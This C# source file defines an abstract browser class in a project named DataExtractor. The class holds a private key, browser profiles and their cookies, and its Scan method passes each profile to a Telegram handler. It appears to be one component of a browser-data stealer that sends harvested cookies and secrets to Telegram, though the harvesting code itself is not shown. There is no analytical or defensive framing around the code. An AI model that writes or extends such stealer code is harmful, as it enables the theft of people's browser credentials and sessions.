using System.Collections.Generic;
using DataExtractor.Core.Handlers;
using DataExtractor.Core.Models.Browsers.BrowserDataInfo;

namespace DataExtractor.Core.Models;

public abstract class MyBrowser
{
	public string PrivateKey { get; set; }

	public virtual string UserAgent { get; set; }

	public Browser BrowserData { get; set; }

	public List<BrowserProfile> Profiles { get; } = new List<BrowserProfile>();


	public void Scan(TelegramHandler telegramHandler)
	{
		foreach (BrowserProfile profile in Profiles)
		{
			if (profile.Cookies != null && profile.Cookies.Count > 0)
			{
				profile.Cookies.Clear();
			}
			Scan(profile, telegramHandler);
		}
	}

	protected abstract void Scan(BrowserProfile profile, TelegramHandler telegramHandler);
}
